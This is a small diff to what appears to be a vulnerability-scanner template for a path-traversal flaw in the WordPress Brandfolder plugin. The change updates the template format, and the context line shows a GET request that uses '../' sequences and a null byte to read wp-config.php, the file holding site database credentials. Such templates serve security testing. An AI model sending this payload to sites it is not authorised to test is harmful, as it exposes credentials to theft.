@@ -13,8 +13,10 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: lfi,rfi,edb,wordpress,wp-plugin
+  metadata:
+    max-request: 1
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00'
